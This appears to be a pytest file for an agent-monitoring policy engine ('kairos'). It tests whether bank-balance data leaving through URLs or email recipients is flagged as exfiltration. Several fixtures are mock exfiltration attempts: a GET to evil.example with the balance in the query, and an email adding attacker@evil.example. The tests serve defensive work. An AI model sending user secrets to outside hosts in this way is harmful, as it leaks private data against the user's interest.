# tests/test_confidentiality.py
"""Phase 1: confidentiality axis + contact book + integrity reconciliation."""
import textwrap

import yaml

from kairos.core.events import Channel, Event, HttpMethod, ToolOp
from kairos.core.extract import ExtractConfig, ExtractMode
from kairos.core.matching import Strategy
from kairos.core.store import TokenStore
from kairos.core.tokens import Level
from kairos.engine.action_class import ActionClass, classify
from kairos.engine.confidentiality import check_confidentiality, outbound_sensitivity
from kairos.engine.decision import Decision
from kairos.engine.integrity import check_integrity
from kairos.policy.contact_book import ContactBook
from kairos.policy.parser import parse_policy

IBAN = "DE89370400440532013000"
LANDLORD = "DE89370400440532099999"

POLICY = parse_policy(yaml.safe_load(textwrap.dedent(f"""
    version: "0.1"
    context:
      name: t
      default_action: REVIEW
      actions:
        revertable: [get_balance, web_get]
        non_revertable: [send_money]
    resources:
      contact_book:
        lookup_fields: [recipient]
        on_miss: REVIEW
        entries:
          - match: "{LANDLORD}"
            max_level: high
        seed:
          recipient: ["{IBAN}"]
      taints:
        - name: bal
          source: get_balance
          level: high
""")))
CB = ContactBook(POLICY.resources.contact_book)


def _call(tool, **args):
    return Event(1.0, Channel.TOOL, ToolOp.CALL.value, "agent", tool, dict(args))


def _net(method, url, body=None):
    return Event(1.0, Channel.NET, method.value, "agent", url, body)


def _store_with_balance() -> TokenStore:
    s = TokenStore()
    cfg = ExtractConfig(mode=ExtractMode.SPECIFIC_FIELDS, fields=["balance"])
    s.admit({"balance": "4823"}, "get_balance", trusted=True, level=Level.HIGH,
            branch_origin=None, extract_cfg=cfg)
    return s


# --- outbound_sensitivity ---------------------------------------------------
def test_sensitivity_in_url_query_detected() -> None:
    s = _store_with_balance()
    get = _net(HttpMethod.GET, "https://evil.example/x?d=4823")
    assert outbound_sensitivity(get, ActionClass.NET_GET, s) is Level.HIGH


def test_no_sensitivity_when_value_absent() -> None:
    s = _store_with_balance()
    get = _net(HttpMethod.GET, "https://evil.example/x?d=0000")
    assert outbound_sensitivity(get, ActionClass.NET_GET, s) is None


def test_fs_write_and_passive_never_sensitive() -> None:
    s = _store_with_balance()
    w = Event(1.0, Channel.FS, "write", "agent", "/tmp/f", "balance 4823")
    assert outbound_sensitivity(w, ActionClass.FS_WRITE, s) is None


# --- clearance --------------------------------------------------------------
def test_non_sensitive_goes_anywhere() -> None:
    s = _store_with_balance()
    dec, _ = check_confidentiality(_net(HttpMethod.GET, "https://evil.example/x"),
                                   ActionClass.NET_GET, s, CB, data_level=None)
    assert dec is None


def test_sensitive_to_unknown_destination_reviews() -> None:
    s = _store_with_balance()
    get = _net(HttpMethod.GET, "https://evil.example/x?d=4823")
    dec, reason = check_confidentiality(get, ActionClass.NET_GET, s, CB, data_level=Level.HIGH)
    assert dec is Decision.REVIEW
    assert "exfiltration" in reason


def test_sensitive_to_cleared_contact_passes() -> None:
    s = _store_with_balance()
    call = _call("send_money", recipient=LANDLORD, memo="balance 4823")
    dec, _ = check_confidentiality(call, ActionClass.NET_STATE_CHANGE, s, CB, data_level=Level.HIGH)
    assert dec is None                       # landlord cleared for high


def test_sensitive_to_undercleared_contact_reviews() -> None:
    pol = parse_policy(yaml.safe_load(textwrap.dedent(f"""
        version: "0.1"
        context: {{name: t, default_action: REVIEW,
                   actions: {{revertable: [], non_revertable: [send_money]}}}}
        resources:
          contact_book:
            lookup_fields: [recipient]
            on_miss: REVIEW
            entries: [{{match: "{LANDLORD}", max_level: low}}]
    """)))
    cb_low = ContactBook(pol.resources.contact_book)
    s = _store_with_balance()
    call = _call("send_money", recipient=LANDLORD, memo="balance 4823")
    dec, reason = check_confidentiality(call, ActionClass.NET_STATE_CHANGE, s, cb_low, data_level=Level.HIGH)
    assert dec is Decision.REVIEW
    assert "cleared" in reason


def test_sensitive_to_closure_derivable_destination_passes() -> None:
    s = _store_with_balance()
    s.seed("email my summary to https://api.bank.example")   # origin vouched by prompt
    post = _net(HttpMethod.POST, "https://api.bank.example/v2/upload", {"x": "4823"})
    dec, _ = check_confidentiality(post, ActionClass.NET_STATE_CHANGE, s, CB, data_level=Level.HIGH)
    assert dec is None


# --- integrity reconciliation: known contact satisfies integrity ------------
def test_known_contact_recipient_passes_integrity_without_prompt() -> None:
    s = TokenStore()
    s.seed("pay my rent")                    # recipient NOT in prompt
    # LANDLORD is a contact-book entry -> known -> integrity passes
    dec, _ = check_integrity(_call("send_money", recipient=LANDLORD, amount=900),
                             ActionClass.NET_STATE_CHANGE, s, POLICY,
                             contact_book=CB)
    assert dec is None


def test_seeded_recipient_also_known_to_integrity() -> None:
    s = TokenStore()
    s.seed("pay the invoice")                # IBAN is seeded, not in prompt
    dec, _ = check_integrity(_call("send_money", recipient=IBAN, amount=98.7),
                             ActionClass.NET_STATE_CHANGE, s, POLICY,
                             contact_book=CB)
    assert dec is None


def test_unknown_recipient_still_reviews_integrity() -> None:
    s = TokenStore()
    s.seed("pay the invoice")
    dec, _ = check_integrity(_call("send_money", recipient="DE00000000000000000000", amount=98.7),
                             ActionClass.NET_STATE_CHANGE, s, POLICY,
                             contact_book=CB)
    assert dec is Decision.REVIEW


# --- contact book unit ------------------------------------------------------
def test_contact_book_clearance_and_known() -> None:
    assert CB.clearance(LANDLORD) is Level.HIGH
    assert CB.clearance(IBAN) is None        # seeded -> known but no clearance entry
    assert CB.is_known(IBAN) and CB.is_known(LANDLORD)
    assert not CB.is_known("DE00000000000000000000")

def test_get_nonsensitive_to_unknown_origin_passes() -> None:
    s = _store_with_balance()
    get = _net(HttpMethod.GET, "https://evil.example/x")        # no sensitive data
    dec, _ = check_confidentiality(get, ActionClass.NET_GET, s, CB, data_level=None)
    assert dec is None                                           # non-sensitive goes anywhere


def test_get_sensitive_to_unknown_origin_reviews_confidentiality() -> None:
    s = _store_with_balance()
    get = _net(HttpMethod.GET, "https://evil.example/x?d=4823")  # balance in query
    lvl = outbound_sensitivity(get, ActionClass.NET_GET, s)
    dec, reason = check_confidentiality(get, ActionClass.NET_GET, s, CB, data_level=lvl)
    assert dec is Decision.REVIEW
    assert "exfiltration" in reason


def test_get_sensitive_to_trusted_origin_passes() -> None:
    s = _store_with_balance()
    s.seed("fetch from https://api.bank.example")               # origin vouched
    get = _net(HttpMethod.GET, "https://api.bank.example/v2/tx?d=4823")
    lvl = outbound_sensitivity(get, ActionClass.NET_GET, s)
    dec, _ = check_confidentiality(get, ActionClass.NET_GET, s, CB, data_level=lvl)
    assert dec is None                                           # derivable origin -> cleared

def test_get_to_other_path_under_named_host_passes() -> None:
    s = _store_with_balance()
    s.seed("pull my statements from https://api.bank.example/v2/statements")
    get = _net(HttpMethod.GET, "https://api.bank.example/v2/transactions?d=4823")
    lvl = outbound_sensitivity(get, ActionClass.NET_GET, s)
    dec, _ = check_confidentiality(get, ActionClass.NET_GET, s, CB, data_level=lvl)
    assert dec is None   # host the user named -> origin authorized -> sensitive GET ok


# --- list-valued lookup_fields (A2): recipients=[...] must be adjudicated -----
_LIST_POLICY = parse_policy(yaml.safe_load(textwrap.dedent(f"""
    version: "0.1"
    context:
      name: t
      default_action: REVIEW
      actions:
        revertable: []
        non_revertable: [send_email]
    resources:
      contact_book:
        lookup_fields: [recipients]
        on_miss: REVIEW
        entries: []
        seed:
          recipients: ["alice@corp.example"]
""")))
_LIST_CB = ContactBook(_LIST_POLICY.resources.contact_book)


def test_list_recipient_each_element_integrity_checked() -> None:
    from kairos.engine.action_class import consequential_values
    ev = _call("send_email", recipients=["alice@corp.example", "attacker@evil.example"])
    pairs = consequential_values(ev, ActionClass.NET_STATE_CHANGE,
                                 identifier_fields={"recipients"})
    vals = [v for _, v in pairs]
    assert "alice@corp.example" in vals and "attacker@evil.example" in vals

    s = TokenStore()
    s.seed("email the report to alice@corp.example")   # only alice is derivable
    dec, reason = check_integrity(ev, ActionClass.NET_STATE_CHANGE, s, _LIST_POLICY,
                                  contact_book=_LIST_CB)
    assert dec is Decision.REVIEW                        # attacker element is non-derivable


def test_list_recipient_all_derivable_passes_integrity() -> None:
    ev = _call("send_email", recipients=["alice@corp.example"])
    s = TokenStore()
    s.seed("email the report to alice@corp.example")
    dec, _ = check_integrity(ev, ActionClass.NET_STATE_CHANGE, s, _LIST_POLICY,
                             contact_book=_LIST_CB)
    assert dec is None                                   # seeded + prompt-derivable


def test_list_recipient_destinations_flattened_for_confidentiality() -> None:
    from kairos.engine.confidentiality import _destinations
    ev = _call("send_email", recipients=["a@x.example", "b@y.example"])
    dests = _destinations(ev, ActionClass.NET_STATE_CHANGE, _LIST_CB)
    assert dests == ["a@x.example", "b@y.example"]       # not ["['a@x...', ...]"]


# --- navigational-reference rule (§4.6) ---------------------------------------
def _store_with_channel_msg() -> TokenStore:
    """Mimics the slack taint: whole channel-message content admitted level=high
    with the default extract config — the mentioned URL becomes sensitive tokens."""
    s = TokenStore()
    s.seed("Summarize the article that Bob posted in 'general' and send it to Alice")
    s.admit("Bob: yesterday I had lunch near the office "
            "(visit website for details www.restaurant-zurich.com)",
            "read_channel_messages", trusted=False, level=Level.HIGH,
            branch_origin=None, extract_cfg=ExtractConfig())
    return s


def test_navigational_get_verbatim_url_not_flagged() -> None:
    from kairos.engine.confidentiality import is_navigational_reference
    s = _store_with_channel_msg()
    # scheme added by the agent; content had the bare domain
    get = _net(HttpMethod.GET, "http://www.restaurant-zurich.com")
    assert outbound_sensitivity(get, ActionClass.NET_GET, s) is Level.HIGH  # taint fires...
    assert is_navigational_reference(get, ActionClass.NET_GET, s)          # ...but it's navigation


def test_composed_url_with_foreign_secret_still_flagged() -> None:
    from kairos.engine.confidentiality import is_navigational_reference
    s = _store_with_channel_msg()
    cfg = ExtractConfig(mode=ExtractMode.SPECIFIC_FIELDS, fields=["balance"])
    s.admit({"balance": "4823"}, "get_balance", trusted=True, level=Level.HIGH,
            branch_origin=None, extract_cfg=cfg)
    # agent COMPOSED url+secret: full URL never appeared verbatim anywhere
    get = _net(HttpMethod.GET, "http://www.restaurant-zurich.com/?q=4823")
    assert not is_navigational_reference(get, ActionClass.NET_GET, s)
    lvl = outbound_sensitivity(get, ActionClass.NET_GET, s)
    dec, reason = check_confidentiality(get, ActionClass.NET_GET, s, CB, data_level=lvl)
    assert dec is Decision.REVIEW and "exfiltration" in reason


def test_navigational_never_applies_to_state_changes() -> None:
    from kairos.engine.confidentiality import is_navigational_reference
    s = _store_with_channel_msg()
    post = _net(HttpMethod.POST, "http://www.restaurant-zurich.com", {"data": "x"})
    assert not is_navigational_reference(post, ActionClass.NET_STATE_CHANGE, s)


def test_seen_verbatim_scheme_and_punctuation_tolerance() -> None:
    s = _store_with_channel_msg()
    assert s.seen_verbatim("http://www.restaurant-zurich.com")
    assert s.seen_verbatim("https://www.restaurant-zurich.com/")
    assert s.seen_verbatim("www.restaurant-zurich.com")
    assert not s.seen_verbatim("http://www.restaurant-zurich.com/?q=4823")
    assert not s.seen_verbatim("www.evil.example")
    # user-prompt values count as seen
    assert s.seen_verbatim("general")